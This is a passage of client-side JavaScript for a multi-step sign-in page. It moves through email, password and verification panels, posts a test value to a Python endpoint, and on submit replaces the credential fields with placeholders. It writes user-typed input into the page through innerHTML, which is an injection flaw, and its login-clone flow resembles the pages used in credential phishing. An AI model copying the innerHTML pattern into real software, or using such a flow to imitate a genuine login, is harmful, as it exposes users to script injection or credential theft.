var nextBtn = document.querySelector(".sign-in-next-btn-submit");
var signInBtn = document.querySelector(".sign-in-btn-submit")

var verifyDiv = document.querySelector(".verification-form")

var passwordDiv = document.querySelector(".password-sign-in-form");
var emailDiv = document.querySelector(".email-sign-in-form");
var loadingDiv = document.querySelector(".loading-screen");

//call python function

function postData(input) {
  $.ajax({
      type: "POST",
      url: "/runmain.py",
      data: { param: input },
      success: callbackFunc
  });
}

function callbackFunc(response) {
  // do something with the response
  console.log(response);
}
postData("test")

nextBtn.addEventListener("click", function(event) {
    event.preventDefault(); 
    passwordDiv.style.display = "block";
    emailDiv.style.display = "none";
});

signInBtn.addEventListener("click", function(event) {
    event.preventDefault(); 
    verifyDiv.style.display = "block";
    passwordDiv.style.display = "none";
});

let usernameValue = localStorage.getItem("username") || "";

function returnUsername() {
  usernameValue = document.getElementById("username").value;
  localStorage.setItem("username", usernameValue);
  document.getElementById("display-name").innerHTML = usernameValue;
  return usernameValue;
}

document.getElementById("username").addEventListener("keyup", returnUsername);

var emailInput = document.getElementsByName("email")[0];
var passwordInput = document.getElementsByName("password")[0];

document.getElementById("submitButton").addEventListener("click", function() {

  emailInput.value = "example@example.com";
  passwordInput.value = "password";

  document.forms[0].submit();








